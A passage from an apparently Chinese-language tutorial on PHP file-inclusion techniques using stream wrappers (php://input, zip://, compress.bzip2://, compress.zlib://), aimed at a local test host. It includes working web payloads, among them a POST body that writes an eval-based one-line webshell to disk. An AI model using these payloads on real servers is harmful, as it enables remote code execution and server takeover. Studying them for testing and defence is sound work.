+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>$fp    =  fopen ( &#39;data://text/plain;base64,&#39; ,  &#39;r&#39; );
+</span></span><span class=line><span class=cl>$meta  =  stream_get_meta_data ( $fp );
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 打印 &#34;text/plain&#34;
+</span></span><span class=line><span class=cl>echo  $meta [ &#39;mediatype&#39; ];
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></td></tr></table></div></div><h2 id=4-phpinput>4. php://input<a hidden class=anchor aria-hidden=true href=#4-phpinput>#</a></h2><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>php://input的使用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>http</span><span class=o>://</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=k>include</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>input</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>POST</span> <span class=nx>DATA部分</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>phpinfo</span><span class=p>();</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>写入一句话木马</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>http</span><span class=o>://</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=k>include</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>input</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>POST</span> <span class=nx>DATA部分</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>fputs</span><span class=p>(</span><span class=nx>fopen</span><span class=p>(</span><span class=s1>&#39;1juhua.php&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>),</span><span class=s1>&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;</span><span class=p>);</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>例如：
+http://127.0.0.1/cmd.php?cmd=php://input
+POST数据：
+注意：
+当enctype=&ldquo;multipart/form-data"的时候 php://input` 是无效的</p><p>遇到file_get_contents()要想到用php://input绕过。</p><h2 id=5-zipbzipzlib-协议>5. zip://bzip://zlib:// 协议<a hidden class=anchor aria-hidden=true href=#5-zipbzipzlib-协议>#</a></h2><p>作用：</p><p>zip:// & bzip:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可以修改为任意后缀名，如 jpg，png，gif，xxx等</p><p>示例：</p><p><strong>1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件文件名](# 的编码为 %23)</strong></p><p>压缩 phpinfo.txt 为phpinfo.zip ,压缩包重命名为 phpinfo.jpg ,并上传</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+</span></span></span></code></pre></td></tr></table></div></div><p><strong>2.compress.bzip2://file.bz2</strong></p><p>压缩phpinfo.txt 为phpinfo.bz2 并上传（同样支持任意后缀名)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+</span></span></span></code></pre></td></tr></table></div></div><p>3.compress.zlib://file.gz</p><p>压缩phpinfo.txt 为phpinfo.gz 并上传（支持任意后缀名）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+</span></span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="复制";function s(){t.innerHTML="已复制！",setTimeout(()=>{t.innerHTML="复制"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
